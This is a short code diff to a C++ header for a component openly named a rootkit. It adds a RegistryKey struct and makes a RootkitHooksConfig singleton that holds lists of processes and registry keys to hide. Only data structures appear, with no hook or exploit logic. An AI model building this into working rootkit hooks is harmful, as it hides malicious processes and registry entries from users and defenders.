@@ -1,20 +1,29 @@
 #pragma once
+#include "Structs\Structs.h"
+#include "Utils\List.h"
 
-#include <basetsd.h>
-#include <windef.h>
-
-#include "Utils/List.h"
-
-struct Process
+struct RegistryKey
 {
-	DWORD PID;
-
+    PWCHAR registryName;
+    ULONG registryLength;
+    List<SubKey> subkeysList;
 };
 
 class RootkitHooksConfig
-{
-
+{    
+    List<Process> hiddenProcessesList;
+    List<RegistryKey> RegistryList;
 public:
 
-	static List<Process> hiddenProcesses;
+    
+
+    static RootkitHooksConfig& getInstance()
+    {
+        static RootkitHooksConfig instance;
+        return instance;
+    }
+
+    List<Process> getHiddenProcessList();
+
+    List<RegistryKey> getRegistryList();
 };
